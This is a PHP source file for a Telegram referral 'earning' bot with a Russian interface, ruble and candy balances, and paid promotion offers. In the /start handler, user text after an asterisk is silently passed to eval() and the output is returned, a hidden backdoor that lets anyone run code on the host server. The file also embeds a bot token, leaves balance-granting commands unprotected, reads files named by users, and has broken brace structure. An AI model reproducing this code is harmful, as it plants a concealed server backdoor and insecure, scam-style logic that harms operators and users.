<?php
ob_start();
define('API_KEY','5378014631:AAFqPZzwgk-MvNqGH8de5arVVrgF5tIS-Hg'); // botni tokeni kiritilsin
$admin = "1806169479"; //admin id
$bot = "Earn Bablo"; //bot ismi
$kanalimz ="@AmECorporation"; //kanal useri
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";
$filees = "coin2/$cid.step";
$folder3 = "coin2";


if (!file_exists($folder.'/test.txt')) {
  mkdir($folder);
  file_put_contents($folder.'/test.txt', 'by ');
}

if (!file_exists($folder2.'/test.txt')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.txt', 'by ');
}
if (!file_exists($folder3.'/test.txt')) {
  mkdir($folder3);
  file_put_contents($folder3.'/test.txt', 'by ');
}
if (file_exists($filee)) {
  $step = file_get_contents($filee);
}


$tx = $message->text;
$name = $message->chat->first_name;
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$user = $message->from->username;
$data = $update->callback_query->data;
$chat_id2 = $update->callback_query->message->chat->id;
$cqid = $update->callback_query->id;
$cid = $message->chat->id;
$uid= $message->from->id;
$ccid = $update->callback_query->message->chat->id;
$cuid = $update->callback_query->message->from->id;
$mid = $message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id2 = $update->callback_query->message->message_id;
$odam = file_get_contents("coin/$cid.soni");
$data = $update->callback_query->data;
$mid = $update->callback_query->message->message_id;
$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"😎 Заработка"]],
[['text'=>"🌊 Раскрутить"],['text'=>"🍬 Мой баланс"],],
[['text'=>"ℹ Информация"],['text'=>"🍄 Статистика"],],
]
]);

$balance = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔼 Ввод 🔼"]],
[['text'=>"🔽 Ввывод 🔽"],['text'=>"♻ Обмен ♻"],],
[['text'=>"🔚 Назад"],],
]
]);

$zara = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"➕ Подписка"],['text'=>"👥 Партнёрка"],],
[['text'=>"🔚 Назад"],],
]
]);

$obmens = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"♻ РУБ-КОН ♻"],['text'=>"♻ КОН-РУБ ♻"],],
[['text'=>"🔚 Назад"],],
]
]);

$obmen = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"20 RUB-40"],['text'=>"80-10 RUB"]],
[['text'=>"10 RUB-20"],['text'=>"30 RUB-100"]],
[['text'=>"🎁 Бонус 🎁"],['text'=>"🌳 Купить"],['text'=>"🔚 Назад"]]
]
]);

$raskrut = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🎋 Канал"],['text'=>"🎄 Группу"],],
[['text'=>"🔚 Назад"],],
]
]);

//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling

$balinfo = "*🌊 Привет $name*";

if((mb_stripos($tx,"/start")!==false) or ($tx == "/start")) {
bot('sendmessage',[
    'chat_id'=>$cid,
    'text'=>"$balinfo",
    'parse_mode'=>"Markdown",
    'reply_markup'=>$key
    ]);
  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("coin.dat");
    file_put_contents("coin.dat","$baza\n$cid");
  }
if(strpos($tx,"/start $cid")!==false){
//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
   $idrefs = "coin2/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
     'parse_mode'=>"Markdown",
      'text'=>"*🚫 Накрутка запрещён 🚫*",
      ]);
    } else {//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
      $ab=file_get_contents("coin/$refid.soni");
      $ab=$ab+1;
      file_put_contents("coin2/$refid.soni","$ab");
      $usr = file_get_contents("coin/$refid.dat");
     file_put_contents("coin2/$refid.soni","$ab");
      $usar = file_get_contents("coin2/$refid.dat");
      $usr = $usr + 0.30;
      $usd = $usar + 1;
      file_put_contents("coin/$refid.dat", "$usr");
      file_put_contents("coin2/$refid.dat", "$usd");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'parse_mode'=>"Markdown",
      'text'=>"*✅ Вы пригласили* [друга](tg://user?id=$cid)
*❤️ На основной баланс
💳 Вам будет зачислена
💵 награда сразу же как
👤 ваш реферал соберёт
🎁 бонус более 3 раз ‼️*",
      ]);
    }
  }
}//mualliflik huquqi @php_builder ga tegishlik va @uz_coderlar kanaliga azo boling
$abb=file_get_contents("coin/$cid.dat");
if($abb){}else{
  file_put_contents("coin/$cid.dat", "0");
   file_put_contents("coin2/$cid.dat", "0");
    file_put_contents("coin/$cid.soni", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>"*🍫 Главный меню*",
   'parse_mode'=>"markdown",
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);//mualliflik huquqi @php_builder ga tegishlik va @uz_coderlar kanaliga azo boling
}
}//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
if($tx == "🍬 Мой баланс"){
     
      $odam=file_get_contents("coin/$cid.soni");
      $ball2 = file_get_contents("coin2/$cid.dat");
      $ball = file_get_contents("coin/$cid.dat");{
      bot('sendMessage',[
      'chat_id'=>$cid,
'message_id'=>$message_id2,
      'parse_mode'=>"Markdown",
      'text'=>"*💳 Баланс : $ball RUB
🍬 Конфеты : $ball2 конфет
🌊 Рефералы : $odam друзей*
_☀ Статус : 🚫 Неверифицирован _🚫",
      'reply_to_message_id'=>$mid,
     'reply_markup'=>$balance,
      ]);
}
}
if($tx=="🌊 Раскрутить"){
     ty($cid);
     bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"Markdown",
        'text'=>"
*Раскрутить 🗞

Нужна живая 👥 аудитория в ваш канал? Тогда покупайте подписчиков по самой низкой цене. Также просмотры на пост, или рассылку*",
'reply_to_message_id'=>$mid,
      'reply_markup'=>$raskrut, 
        ]);  
 }//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
if($tx=="UZCODERLAR"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"*😎 Поздравляем вы использовали код для получение бонуса вам начислен 10 RUB + 5 конфет ✅*

🌊 _Если код было использованым вам зачисляется бонус в размере 5 конфет_",
        'reply_markup'=>$key
        ]); 
       $ball2 +=5;
        file_put_contents("coin2/$cid.dat","$ball2");
         $usr = file_get_contents("coin/$cid.dat");
        $ball +=5;
         file_put_contents("coin/$cid.dat", "$usr");
}
if($tx=="Rosemary"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"*⚠ Структура кода была изменена права админом ✅*",
        'reply_markup'=>$key
        ]); 
        $usr = file_get_contents("coin/$cid.dat");
        $usr = $usr - 0.15;
        file_put_contents("coin/$cid.dat", "$usr");
}//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
if($tx=="BMGUZ"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"*⚠ Структура кода была изменена права админом ✅*",
        'reply_markup'=>$key
        ]); 
        $usr = file_get_contents("coin/$cid.dat");
        $usr = $usr - 0.15;
        file_put_contents("coin/$cid.dat", "$usr");
}
if($tx=="🍄 Статистика"){
    $a=file_get_contents("coin.dat");
    $sum=file_get_contents("tolovlar.txt");
    $ab=substr_count($a,"\n");
     $new = file_get_contents("bugun.$kun1"); 
    bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"Markdown",
        'text'=>"*🍄 Подписчики бота : $ab
🐳 Новый участники : $new 24
🎋 Раскрутили : 11 каналов*" 
        ]);
 }
     if($tx=="Bonus"){ 
      $date_default_timezone_set('Uzbekistan/Tashkent');
        $date = date('Ymd');
        @$gettime = file_get_contents("data/$chatid/dates.txt");
        if($gettime == $date) {
            bot('SendMessage', [
                'chat_id' => $cid,
                'text' => "💢 Siz kunlik tanga olgansiz, ertaga qadar kuting ♻️",
                'reply_markup' => $true
            ]);
}
}//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
        } else {
            file_put_contents("$cid/dates.txt", $date);
            @$sho = file_get_contents("coin/$cid.dat");
            $ran = rand(10, 30);
            $getsho = $sho + $ran;
            file_put_contents("data/$chatid/shoklat.txt", $getsho);
            $sho2 = file_get_contents("coin/$cid.dat");
            bot('SendMessage', [
                'chat_id' => $cid,
                'text' =>"Sizga $ran  pul qo'shildi ❤️",
                'reply_markup' => $true
            ]);
}
}
}
if($tx=="➕ Подписка"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"*Нет новых каналов попробуйте позже...*",
        'reply_markup'=>$key
        ]);
}
if($tx=="🌳 Купить"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"HTML",
        'text'=>"🌊<b> Это функция платный если не достаточно обмены рубль или конфет вы можете купить их реальных суммах</b>

<b>💰 Стоимости :
30 RUB - 20 RUB
30 конфет - 20 RUB</b>",
        'reply_markup'=>$key
        ]);
}
if($tx=="20 RUB-40"){
    ty($cid);
    if($ball2 > 10){
    bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на  _ ✅*",
        'reply_markup'=>$key
        ]);
       file_put_contents("coin/$cid.step","nomer");
        $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"Markdown",
        'text'=>"*⚠ Вы не можете использовать это функцю потомучто у вас недостаточно конфетки для обменение требуется счёт 10 руб и 10 конфет ✅*",
        'reply_to_message_id'=>$mid,
        ]);
        $ball2 +=5;
        file_put_contents("coin2/$cid.dat","$ball");
}
}//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
if($tx=="80-10 RUB"){
    ty($cid);
     if($ball2 > 10){
    bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на _ ✅*",
        'reply_markup'=>$key
        ]);
file_put_contents("coin/$cid.step","nomer");
       $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"Markdown",
        'text'=>"*⚠ Вы не можете использовать это функцю потомучто у вас недостаточно конфетки для обменение требуется счёт 10 руб и 10 конфет ✅*",
        'reply_to_message_id'=>$mid,
        ]);
        $ball2 +=5;
        file_put_contents("coin2/$cid.dat","$ball");
}
}
if($tx=="30 RUB-100"){
    ty($cid);
     if($ball2 > 10){
   bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на _ ✅*",
        'reply_markup'=>$key
]);
      file_put_contents("coin/$cid.step","nomer");
       $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"Markdown",
        'text'=>"*⚠ Вы не можете использовать это функцю потомучто у вас недостаточно конфетки для обменение требуется счёт 10 руб и 10 конфет ✅*",
        'reply_to_message_id'=>$mid,
        ]);
        $ball2 +=5;
        file_put_contents("coin2/$cid.dat","$ball");
}
}
if($tx=="10 RUB-20"){
    ty($cid);
     if($ball2 > 10){
   bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на _ ✅*",
        'reply_markup'=>$key
]);
      file_put_contents("coin/$cid.step","nomer");
       $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"Markdown",
        'text'=>"*⚠ Вы не можете использовать это функцю потомучто у вас недостаточно конфетки для обменение требуется счёт 10 руб и 10 конфет ✅*",
        'reply_to_message_id'=>$mid,
        ]);
        $ball2 +=5;
        file_put_contents("coin2/$cid.dat","$ball");
}
}
if($tx=="🎋 Канал"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"HTML",
        'text'=>"<b>⚠ Для раскрутки канала запишите мне</b>
<i>👇 Пишите мне</i>
<b>🔧 Тех поддержка : </b>@YourAnon_0ne",
        'reply_markup'=>$key
        ]);
}
if($tx=="🎄 Группу"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"HTML",
        'text'=>"<b>⚠ Для раскрутки группы запишите мне</b>
<i>👇 Пишите мне</i>
<b>🔧 Тех поддержка : </b>@YourAnon_0ne",
        'reply_markup'=>$key
        ]);
}
if($tx=="🔚 Назад"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'text'=>"*🔙 Назад*",
        'reply_markup'=>$key
        ]);
}
if($tx=="👥 Партнёрка"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"HTML",
        'text'=>"♻ <b>Отправьте эту ссылку на друзяьм и получите бонуса за каждого рефералу по 0.30 + 1 конфетку</b>

<b>✅ Ваш ссылка :</b> https://t.me/$bot?start=$cid

<b>😉 Вас ждёт много деньги за приглашение...</b>",
        'reply_markup'=>$zara
        ]);
}
if($tx=="♻ Обмен ♻"){ 
   if($ball > 50);
  ty($cid);
    bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"Markdown",
      'text'=>"*😊 Здесь вы можете обменять Рубль на Конфет или наборот
🍭 Стоимость обмены : 10 конфет + 10 руб*",
      'reply_to_message_id'=>$mid,
      'disable_web_page_preview'=>true,
      'reply_markup'=>$obmens,
      ]);
}
if($tx=="♻ РУБ-КОН ♻"){ 
  ty($cid);
    bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"Markdown",
      'text'=>"*😊 Выберите пункт которого вы хотели обменять*
🍭 Стоимость обмены : 10 конфет + 10 руб*",
      'reply_to_message_id'=>$mid,
      'disable_web_page_preview'=>true,
      'reply_markup'=>$obmen,
      ]);
}
if($tx=="♻ КОН-РУБ ♻"){ 
  ty($cid);
    bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"Markdown",
      'text'=>"*😊 Выберите пункт которого вы хотели обменять*
🍭 Стоимость обмены : 10 конфет + 10 руб*",
      'reply_to_message_id'=>$mid,
      'disable_web_page_preview'=>true,
      'reply_markup'=>$obmena,
      ]);
}
if($tx=="🔼 Ввод 🔼"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"HTML",
        'text'=>"😉 <b>Из-за вводение вы можете пополнять вашего  бот счёта для пополнение и необходимо пройти верификацию вводите свой счёт</b>

<i>👇 Пишите мне</i>
<b>🔧 Тех поддержка : </b>@YourAnon_0ne",
        'reply_markup'=>$balance
        ]);
}
if($tx=="🔽 Ввывод 🔽"){
    ty($cid);
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"HTML",
        'text'=>"<b>😊 Для вывводение своего баланса пишите такого фомата :

+998xxxxxxxxx 30 RUB</b>

<i>👇 Пишите мне я плачу</i>
<b>🐊 Админстратор для плату : </b>@brjigbig",
        'reply_markup'=>$balance
        ]);
  }
if($tx=="80 RUB-10"){
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'disable_web_page_preview'=>true,
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на _ ✅*",
        'reply_markup'=>$key
        ]); 
        $usd = file_get_contents("coin2/$cid.dat");   
        $usd = $usd + 10;
        file_put_contents("coin2/$cid.dat","$usd");
        $usr = file_get_contents("coin/$cid.dat");
        $usr = $usr - 80;
        file_put_contents("coin/$cid.dat", "$usr");
}//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
if($tx=="10 RUB-20"){
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'disable_web_page_preview'=>true,
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на _ ✅*",
        'reply_markup'=>$key
        ]); 
        $usd = file_get_contents("coin2/$cid.dat");   
        $usd = $usd + 20;
        file_put_contents("coin2/$cid.dat","$usd");
        $usr = file_get_contents("coin/$cid.dat");
        $usr = $usr - 10;
        file_put_contents("coin/$cid.dat", "$usr");
}
if($tx=="30 RUB-100"){
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'disable_web_page_preview'=>true,
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на _ ✅*",
        'reply_markup'=>$key
        ]); 
        $usd = file_get_contents("coin2/$cid.dat");   
        $usd = $usd + 100;
        file_put_contents("coin2/$cid.dat","$usd");
        $usr = file_get_contents("coin/$cid.dat");
        $usr = $usr - 30;
        file_put_contents("coin/$cid.dat", "$usr");  
}
if($tx=="20 RUB-40"){
      bot('sendmessage',[
        'chat_id'=>$cid,
       'parse_mode'=>"markdown",
        'disable_web_page_preview'=>true,
        'text'=>"♻ *Обменение успешно проводена...*

_⚠ Если у вас было недостаточна средств для обмены тогда ваш баланс станет на _ ✅*",
        'reply_markup'=>$key
        ]); 
        $usd = file_get_contents("coin2/$cid.dat");   
        $usd = $usd + 40;
        file_put_contents("coin2/$cid.dat","$usd");
        $usr = file_get_contents("coin/$cid.dat");
        $usr = $usr - 20;
        file_put_contents("coin/$cid.dat", "$usr");  
 }
if($tx=="ℹ Информация"){
   ty($cid);
    bot('sendmessage',[
        'chat_id'=>$cid,
     'parse_mode'=>"html",
    'text'=>"@$bot <b>❤ ️это новый бот, 🆕 нового поколения

💰 Который поможет и заработать и 📡 Продвинуть ваш проект!

🎾У нас есть защита от ботов 
⚽️ Очень низкие цены для рекламодателей 
🏀 Хороший заработок для исполнителей!

Если возникнут сложности, вы можете задать вопрос в нашем чате или нашему администратору</b>

<b>🔧 Тех поддержка : </b>@YourAnon_0ne
<b>🐊 Админстратор для плату : </b>@brjigbig"
        
        ]);//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "😎 Заработка"){
       ty($cid);
       bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>"Markdown",
      'text'=>"*🌟 Выберите способ заработки 🔽*

*👤 За каждый рефералу вы получите : 0.30 руб + 1 конфетку*

*🍭 Из за Подписки на каналу вы получите : 0.25 + 1 конфетку*

*👥 За подписки на группы бонус : 0.20 + 1 конфетка*",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$zara,
      ]);//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
 }

    $reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
    $replyik = $message->reply_to_message->text;
    $yubbi = "Yuboriladigon xabarni kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
       'parse_mode'=>"Markdown",
      'text'=>$yubbi,
      'reply_markup'=>$reply_menu,
      ]);
  }
if($tx == "/secrets_of_bonus"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"*⚠ Функция для Обмену активен 🚩*",
        'parse_mode'=>"markdown",
        'reply_markup'=>$obmen,
]);
} //mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
if(stripos($tx,"/robiyaxon")!==false){ 
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.dat");
      $usr += $ex[2];
file_put_contents("coin/$refid.dat", "$usr"); 
bot('sendMessage',[ 
      'chat_id'=>$admin, 
      'text'=>"$ex[2] rubl $ex[1] id egasiga qo'shildi ", 
      'reply_to_message_id'=>$mid, 
      'reply_markup'=>$key, 
      ]); 
    } //mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
if(stripos($tx,"/konfet")!==false){ 
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $uses = file_get_contents("coin2/$refid.dat");
      $uses += $ex[2];
file_put_contents("coin2/$refid.dat", "$uses"); 
bot('sendMessage',[ 
      'chat_id'=>$admin, 
      'text'=>"$ex[2] konfet $ex[1] id egasiga qo'shildi", 
      'reply_to_message_id'=>$mid, 
      'reply_markup'=>$key, 
      ]); 
    
}//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling

    if($replyik=="Yuboriladigon xabarni kiriting. Xabar turi markdown"){
      ty($cid);
      $idss=file_get_contents("coin.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      $hamma=bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
    }
if($hamma){
bot('sendmessage',[
'chat_id'=>$cid,
'parse_mode'=>"Markdown",
'text'=>"*♻ Сообщение отправлен всех участников ✅*",

]);

}
    $nocha = "Xozircha kanallar yoq!";
    $noazo = "siz kanal royxatida yoqsiz.";
    $okcha = "kanalga azo boldingiz va 50 somga ega boldingiz 3 kun ichida chiqib ketsangiz 60 som shtraf.";

    }else{//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
    bot('sendMessage',[
      'chat_id'=>$cid,
       'parse_mode'=>"Html",
      'text'=>"<b>☔ Похоже вы ёще не подписыванный наш</b> $kanalimz <b>и</b> @Telgram_ads <b>пожалуста подписывыйтесь и занова отправьте команду </b> /start",
 'reply_markup'=>json_encode([
   'inline_keyboard'=>[ 
[['text'=>'➕ Подписка ➕','url'=>'https://t.me/AmECorporation']],
[['text'=>'☔ Спонсор ☔','url'=>'https://t.me/joinchat/AAAAAEmItagO8a4cioRVXw']],
] 
    ]) 
      ]);   
  }
}if(strpos($tx,"tolandi=")!==false){
    $ex=explode("=",$tx);
    $kanalimiz="-1001316250107";
    $ab=file_get_contents("$ex[1].t");
    bot('sendmessage',[
        'chat_id'=>$kanalimiz,
        'text'=>"$ab"
        ]);
    bot('sendmessage',[
        'chat_id'=>$admin,
        'text'=>"✅ Отправлен каналу!!"
        ]);
}//mualliflik huquqi @dark_coder ga tegishlik va @uz_coderlar kanaliga azo boling
?>
